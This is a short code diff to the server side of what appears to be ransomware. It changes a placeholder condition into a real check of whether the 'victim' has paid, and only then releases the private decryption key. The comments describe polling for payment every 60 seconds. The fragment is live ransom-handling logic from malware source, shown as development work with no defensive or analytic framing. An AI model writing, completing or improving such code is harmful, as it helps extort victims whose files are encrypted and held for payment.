@@ -206,7 +206,7 @@ class Server:
                     #Every  60 seconds check if victim paid, if they did send them a message
                     time.sleep(60)
 
-                    if(True):
+                    if(self.check_if_user_paid(initial_balance)):
                         # sends decryption key  (victim is also simultaneously checking if paid and if they have it recives the things below)
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
